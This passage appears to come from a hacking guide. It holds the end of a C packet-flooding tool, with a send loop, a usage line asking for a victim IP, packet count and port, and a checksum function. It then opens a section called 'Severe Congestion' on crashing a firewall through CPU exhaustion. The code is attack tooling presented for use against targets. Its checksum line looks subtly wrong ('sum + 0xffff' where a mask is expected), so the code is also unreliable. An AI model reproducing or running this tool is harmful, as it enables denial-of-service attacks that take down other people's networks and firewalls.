```
{
    fprintf(stderr, "Couldn't send packet: %s\n",
           strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
}
    fprintf(stderr, ".");

}

fprintf(stderr, "\n");
close(fd);

return (EXIT_SUCCESS);
}

void usage (u_char * pname)
{
    fprintf(stderr, "Usage: %s <victim_ip> <packets> [port]\n", pname);
    exit(EXIT_SUCCESS);
}

u_short checksum (u_short *addr, int len)
{
    register int nleft = len;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) {
        sum += *addr++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)addr;
        sum += answer;
    }

    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

/* EOF */
```

# **Severe Congestion**

**Synopsis:** This breach allows a remote attacker to lock up the firewall with 100 percent CPU utilization.

**Hack State:** Severe congestion; system crash.